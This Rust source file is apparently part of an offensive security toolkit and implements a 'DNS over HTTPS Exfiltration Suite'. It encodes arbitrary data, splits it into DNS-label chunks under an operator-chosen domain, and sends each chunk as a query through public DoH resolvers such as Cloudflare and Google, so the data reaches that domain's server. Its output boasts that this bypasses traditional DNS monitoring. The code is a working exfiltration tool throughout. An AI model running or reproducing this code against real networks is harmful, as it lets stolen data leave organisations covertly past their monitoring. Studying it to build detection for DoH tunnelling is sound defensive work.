use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

const DOH_PROVIDERS: &[(&str, &str)] = &[
    ("Cloudflare", "https://cloudflare-dns.com/dns-query"),
    ("Google", "https://dns.google/resolve"),
    ("Quad9", "https://dns.quad9.net/dns-query"),
    ("AdGuard", "https://dns.adguard.com/dns-query"),
    ("NextDNS", "https://dns.nextdns.io/dns-query"),
    ("Mullvad", "https://doh.mullvad.net/dns-query"),
    ("OpenDNS", "https://doh.opendns.com/dns-query"),
    ("CleanBrowsing", "https://doh.cleanbrowsing.org/dns-query"),
];

const DOH_CONTENT_TYPES: &[&str] = &[
    "application/dns-json",
    "application/dns-message",
    "application/dns-udpwireformat",
];

const EXFIL_ENCODINGS: &[(&str, &str)] = &[
    ("Hex", "hex"),
    ("Base32", "base32"),
    ("Base64", "base64"),
    ("URL-encoded", "url"),
    ("Raw", "raw"),
];

pub async fn exfil(domain: &str, data: &str, provider: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} DNS over HTTPS Exfiltration Suite", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Domain: {}", "[*]".cyan().bold(), domain);
    println!(
        "{} Data: {} ({} bytes)",
        "[*]".cyan().bold(),
        data,
        data.len()
    );
    println!("{} Provider: {}", "[*]".cyan().bold(), provider);
    println!(
        "{} {} DoH providers, {} content types, {} encodings",
        "[*]".cyan().bold(),
        DOH_PROVIDERS.len(),
        DOH_CONTENT_TYPES.len(),
        EXFIL_ENCODINGS.len()
    );
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let provider_url = DOH_PROVIDERS
        .iter()
        .find(|(name, _)| name.to_lowercase() == provider.to_lowercase())
        .map(|(_, url)| *url)
        .unwrap_or("https://cloudflare-dns.com/dns-query");

    println!(
        "\n{} [1/4] DoH provider connectivity test...",
        "[*]".cyan().bold()
    );
    for (name, url) in DOH_PROVIDERS {
        match client
            .get(*url)
            .header("Accept", "application/dns-json")
            .query(&[("name", "example.com"), ("type", "A")])
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let has_dns = body.contains("Answer") || body.contains("Status");
                let tag = if status == 200 && has_dns {
                    "READY".green().bold().to_string()
                } else if status == 200 {
                    "200".green().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:15} {:45} {}", "*".cyan(), name, url, tag);
            }
            Err(_) => {
                println!("  {} {:15} {:45} error", "*".red(), name, url);
            }
        }
    }

    println!(
        "\n{} [2/4] Data encoding for exfiltration...",
        "[*]".cyan().bold()
    );
    let encoded: Vec<(String, String)> = EXFIL_ENCODINGS
        .iter()
        .map(|(name, enc)| {
            let encoded_data = match *enc {
                "hex" => data
                    .bytes()
                    .map(|b| format!("{:02x}", b))
                    .collect::<String>(),
                "base32" => base32_encode(data.as_bytes()),
                "base64" => base64_encode(data.as_bytes()),
                "url" => data
                    .bytes()
                    .map(|b| format!("%{:02X}", b))
                    .collect::<String>(),
                _ => data.to_string(),
            };
            (name.to_string(), encoded_data)
        })
        .collect();

    for (name, enc_data) in &encoded {
        println!(
            "  {} {:15} {} chars: {}",
            "*".cyan(),
            name,
            enc_data.len(),
            enc_data.chars().take(60).collect::<String>()
        );
    }

    println!(
        "\n{} [3/4] DNS label exfiltration (chunked)...",
        "[*]".cyan().bold()
    );
    let chunk_size = 63;
    let mut results = Vec::new();

    for (enc_name, enc_data) in &encoded {
        let chunks: Vec<&str> = enc_data
            .as_bytes()
            .chunks(chunk_size)
            .map(|c| std::str::from_utf8(c).unwrap_or(""))
            .collect();

        println!(
            "  {} {} — {} chunks of max {} bytes",
            "*".cyan(),
            enc_name,
            chunks.len(),
            chunk_size
        );

        for (i, chunk) in chunks.iter().enumerate() {
            let subdomain = if chunks.len() > 1 {
                format!("{}{}.{}", i, chunk, domain)
            } else {
                format!("{}.{}", chunk, domain)
            };

            let query_url = format!("{}?name={}&type=TXT", provider_url, subdomain);

            match client
                .get(&query_url)
                .header("Accept", "application/dns-json")
                .send()
                .await
            {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    let body = resp.text().await.unwrap_or_default();
                    let has_answer = body.contains("Answer") || body.contains("answer");
                    let has_nxdomain = body.contains("NXDOMAIN") || body.contains("Status\":3");
                    let tag = if has_answer {
                        "RESOLVED".green().bold().to_string()
                    } else if has_nxdomain {
                        "NXDOMAIN".yellow().to_string()
                    } else {
                        format!("status {}", status)
                    };
                    if (i + 1) % 5 == 0 || i == chunks.len() - 1 {
                        println!(
                            "    {} chunk {:02}/{:02} {} len={:02} {}",
                            ".".cyan(),
                            i + 1,
                            chunks.len(),
                            tag,
                            chunk.len(),
                            subdomain.chars().take(50).collect::<String>()
                        );
                    }
                    if has_answer {
                        results.push(format!("{}:chunk{}", enc_name, i));
                    }
                }
                Err(_) => {
                    println!(
                        "    {} chunk {:02}/{:02} error",
                        "*".red(),
                        i + 1,
                        chunks.len()
                    );
                }
            }
        }
    }

    println!(
        "\n{} [4/4] Content-type bypass tests...",
        "[*]".cyan().bold()
    );
    for ct in DOH_CONTENT_TYPES {
        let query_url = format!("{}?name=test.{}&type=A", provider_url, domain);
        match client.get(&query_url).header("Accept", *ct).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let tag = if status == 200 {
                    "OK".green().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:35} {}", "*".cyan(), ct, tag);
            }
            Err(_) => {
                println!("  {} {:35} error", "*".red(), ct);
            }
        }
    }

    println!(
        "\n{} {} / {} exfil chunks resolved successfully",
        "[*]".cyan().bold(),
        results.len(),
        encoded
            .iter()
            .map(|(_, d)| d.len().div_ceil(chunk_size))
            .sum::<usize>()
    );

    if !results.is_empty() {
        println!(
            "{} [HIGH] DoH exfiltration successful — data sent via DNS queries!",
            "[!]".red().bold()
        );
    }
    println!(
        "{} DoH exfil bypasses traditional DNS monitoring — uses HTTPS to DoH resolver",
        "[*]".cyan().bold()
    );

    Ok(())
}

fn base32_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    let mut result = String::new();
    let mut buffer: u32 = 0;
    let mut bits_left = 0;
    for &b in data {
        buffer = (buffer << 8) | b as u32;
        bits_left += 8;
        while bits_left >= 5 {
            bits_left -= 5;
            let idx = ((buffer >> bits_left) & 0x1F) as usize;
            result.push(ALPHABET[idx] as char);
        }
    }
    if bits_left > 0 {
        let idx = ((buffer << (5 - bits_left)) & 0x1F) as usize;
        result.push(ALPHABET[idx] as char);
    }
    result
}

fn base64_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    for chunk in data.chunks(3) {
        let b = [
            chunk[0],
            *chunk.get(1).unwrap_or(&0),
            *chunk.get(2).unwrap_or(&0),
        ];
        result.push(ALPHABET[(b[0] >> 2) as usize] as char);
        result.push(ALPHABET[((b[0] & 0x03) << 4 | b[1] >> 4) as usize] as char);
        if chunk.len() > 1 {
            result.push(ALPHABET[((b[1] & 0x0F) << 2 | b[2] >> 6) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(ALPHABET[(b[2] & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }
    result
}
